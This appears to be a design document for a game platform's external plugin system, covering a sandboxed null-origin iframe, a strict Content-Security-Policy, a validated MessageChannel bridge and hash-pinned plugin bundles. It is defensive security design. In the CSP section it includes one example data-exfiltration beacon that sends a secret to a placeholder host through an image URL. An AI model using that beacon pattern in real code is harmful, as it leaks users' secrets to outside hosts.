# External plugins (link a game by URL)

How Doot will let anyone register a custom game by **pointing at a repo/URL**, run
it **safely** (it's untrusted code), and develop/test it **standalone**. This is the
design for PRD §9; it is being built in phases (status at the bottom). Grounded in a
survey of Figma, Penpot, VS Code web extensions, Sandpack, and the sandboxed-iframe
+ postMessage pattern.

## The one hard rule

A plugin is **untrusted code**. It must never reach cookies, the session, the DB,
the host DOM, or the raw CLASP relay socket. It may only: render its block's Player
and Host views, receive the (already-redacted) round state, and `submit` one input.
Everything else is mediated by the host. Security is enforced **structurally** (by
the sandbox + a tiny validated bridge), never by reviewing plugin code, because code
review produces false negatives (Figma's own conclusion after a sandbox-escape bug).

## The trust boundary: a null-origin sandboxed iframe on a separate origin

- Plugin UI runs in `<iframe sandbox="allow-scripts">` **without** `allow-same-origin`.
  Adding `allow-same-origin` would let the frame remove its own sandbox, "no more
  secure than no sandbox at all" (MDN). Without it, the frame gets a **`null`
  origin**, so it can't touch `document.cookie`, `localStorage`, or the host DOM.
- Served from a **separate origin** (`plugins.doot.games`, ideally a different
  registrable domain) so even a browser bug lands the plugin on a cookieless,
  session-less origin (the Sandpack lesson).
- Locked down by a strict **Content-Security-Policy** on the plugin origin:
  ```
  default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data:;                     # NOT a remote host - see below
  connect-src 'none';                      # no fetch/XHR/WebSocket
  frame-ancestors https://doot.games;      # only Doot may embed it
  base-uri 'none'; form-action 'none';
  ```
  `connect-src 'none'` blocks fetch/XHR/WebSocket, but it is **not** "cannot
  exfiltrate" on its own: **any allowed remote `img-src` is a beacon channel**
  (`new Image().src = 'https://host/?d=' + secret`). So `img-src` is `'self'` +
  `data:` only — platform media is handed to the plugin **over the bridge**, never as
  a fetchable URL the plugin builds. A reviewed/featured plugin that genuinely needs
  an asset host may be granted a narrow `allowedConnectSrc`/`img-src` (default empty).
  Also note: the plugin **bundle** must be re-hosted **same-origin** on the plugin
  origin so `script-src 'self'` actually covers it — `script-src` is never widened to
  a CDN (a CDN script URL would re-open the exfil/mining surface).

## The bridge (a tiny, validated MessageChannel protocol)

The host creates a `MessageChannel`, hands one port to the iframe in a single
bootstrap message, and ignores anything arriving on `window` afterward. Both
directions are **Zod-validated**; the host treats every inbound message as hostile.

```ts
// Host → plugin
type HostToPlugin =
  | { t: 'init'; block: string; role: 'player' | 'host'; theme: ThemeTokens }
  | { t: 'round'; content: RedactedContent; phase: Phase; index: number }
  | { t: 'state'; myInput: Json | null; phase: Phase; results?: PublicResults }
  | { t: 'answer'; key: AnswerKey }   // sent ONLY at reveal, so answers can't leak early

// Plugin → host (exactly one actionable verb)
const PluginToHost = z.discriminatedUnion('t', [
  z.object({ t: z.literal('ready') }),
  z.object({ t: z.literal('submit'), input: z.unknown() }), // re-validated vs the block's schema before publish
  z.object({ t: z.literal('resize'), h: z.number().max(4000) }),
])
```

The answer-withholding invariant is preserved by construction: the plugin is *given*
the answer key only when the host publishes the reveal, so it literally cannot read
answers early. `submit.input` is validated twice (bridge schema, then the block's
own content/input schema) before the host publishes to CLASP.

## Loading from a repo link (no platform-side building)

Register by **manifest URL** (`plugin.json`), Penpot-style. The manifest points to a
**prebuilt single ES-module bundle** the author publishes (GitHub Pages, a release
asset, or a CDN that serves a repo at a pinned commit, e.g. `esm.sh/gh/owner/repo@<sha>`).

```jsonc
{
  "name": "Trivia Royale",
  "version": "1.2.0",
  "author": "you",
  "bundle": "https://esm.sh/gh/you/trivia-royale@<commit-sha>/dist/plugin.js",
  "integrity": "sha384-…",          // pin exact bytes
  "blocks": [{ "kind": "trivia", "name": "Trivia" }],
  "allowedConnectSrc": []
}
```

Doot **does not build untrusted source** (running an author's build scripts is a
worse trust problem than running sandboxed output). At registration it fetches the
bundle, computes its **SHA-256**, and pins to that immutable hash (via import-map
`integrity` and a server-side re-fetch check). Pin to a **commit/hash, never
`@latest`**, so an approved plugin can't silently mutate.

## Registry policy (three tiers)

1. **Unlisted / host-it-yourself (first external step).** Anyone can paste a manifest
   URL into *their own* room. Their risk; the sandbox protects everyone else.
2. **Open pinned registry.** Listed with a "community / unreviewed" badge, hash-pinned.
3. **Reviewed / featured.** Manually vetted, may be granted a wider `connect-src`.
   Review is a trust signal, **not** the safety boundary (the sandbox is).

## Standalone development (test without the platform)

A dev kit + template so a developer builds and tests a plugin in isolation:

- `npm create doot-game` scaffolds a manifest + a block + Vue Player/Host views.
- `doot dev` runs a Vite dev server (HMR) that embeds the plugin in the **identical
  production sandbox + CSP**, with a **mock host** implementing the real
  `MessageChannel` protocol: a scriptable mock room (step `lobby → round → reveal →
  results`), a fake roster, **simulated other-player submissions** (so `aggregate`
  is exercised), an **answer-withholding simulator** (proves the plugin behaves when
  the key is absent), and a **bridge inspector** that flags any message failing the
  schema, turning the trust boundary into a visible contract.
- `doot build` emits the single ES-module bundle and the SHA for the manifest.

A runnable starter lives in [`examples/external-plugin/`](../examples/external-plugin/).

## Where the code lives (flexible, no core bloat)

- **In the monorepo:** the contract (`@doot-games/sdk`, exists), a future
  `@doot-games/plugin-bridge` (the protocol + host iframe manager + plugin-side
  `connectToHost`), and `@doot-games/plugin-dev` + `create-doot-game` (the harness).
- **Outside the monorepo:** the plugins themselves. They depend only on the public
  contract + bridge packages and ship their own bundle. Doot loads them by URL.

The protocol and dev harness start life in `examples/external-plugin/` (self-
contained, zero core bloat) and graduate to real packages when Phase 1 lands.

## Build phases (smallest safe step first)

0. **Adapter (in-process, no untrusted code).** Render first-party games through the
   `MessageChannel` protocol against an in-process mock host. Forces the
   redacted-content/submit-only contract to exist and be tested first. ← lowest risk.
1. **Sandboxed iframe, first-party only.** Move games into the `allow-scripts`-only
   iframe on `plugins.doot.games` with the production CSP. Proves the boundary with
   trusted code. (Needs the second origin/subdomain - an infra decision.)
2. **Unlisted external plugins.** Manifest-by-URL registration + SHA pinning +
   `connect-src 'none'`, per-room and opt-in.
3. **Open pinned registry** + the dev harness GA.
4. **Reviewed/featured tier** with manifest `connect-src` allowlists.

## Status

- ✅ This design + the security model (deep research).
- ✅ A standalone template + dev-harness sketch in `examples/external-plugin/`.
- ✅ The second-origin decision: a **subdomain** (`plugins.doot.games`), sound because
  Doot's auth cookies are host-only (no `crossSubDomainCookies`, no `.doot.games`
  cookie domain). DNS A record → the `doot-prod` droplet is **live**; `docker/Caddyfile`
  serves it as a static, locked-down origin (the CSP above), never proxied to the app.
- ✅ `bridge.ts` graduated to `@doot-games/plugin-bridge` (Zod protocol + host/plugin
  transport cores, unit-tested). The `examples/external-plugin/` harness stays the
  standalone, copy-pasteable reference.
- ⏳ Phase 0–1 remaining: serve the real host shell from the origin (`file_server`,
  swapping today's placeholder `respond`) + `@doot-games/plugin-dev` + `create-doot-game`.
- ⏳ Phases 2–4 (registration, registry, review) follow.

The full authoring picture (tiers 0–3, the `@vue/repl` editor, the canvas block, the
SDK MCP server, build order) is in [`plugin-authoring-roadmap.md`](./plugin-authoring-roadmap.md).
